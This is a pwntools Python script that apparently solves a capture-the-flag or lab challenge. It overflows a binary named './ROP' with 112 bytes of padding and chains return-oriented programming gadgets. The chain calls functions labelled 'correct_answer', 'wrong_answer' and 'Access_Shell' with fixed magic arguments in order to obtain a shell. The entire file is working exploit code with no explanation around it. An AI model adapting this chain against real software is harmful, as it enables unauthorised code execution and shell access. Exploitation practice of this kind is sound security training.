from pwn import *

padding  = b"A"*112
cor_addr = 0x8049256
wro_addr = 0x804929e
acc_addr = 0x8049333
pop_ret  = 0x8049022
pop3_ret = 0x80494f1

payload  = padding
payload += p32(cor_addr)   # correct_answer
payload += p32(pop_ret)
payload += p32(0xdabbadaa) # correct_answer arg
payload += p32(wro_addr)   # wrong_answer
payload += p32(pop3_ret)
payload += p32(0xfacebaad) # wrong_answer arg1
payload += p32(0xfacefeed) # wrong_answer arg2
payload += p32(0xfacedead) # wrong_answer arg3
payload += p32(acc_addr)   # Access_Shell

with open('input.txt', 'wb') as f:
        f.write(payload)

proc = process(['./ROP','aaa'])
proc.interactive()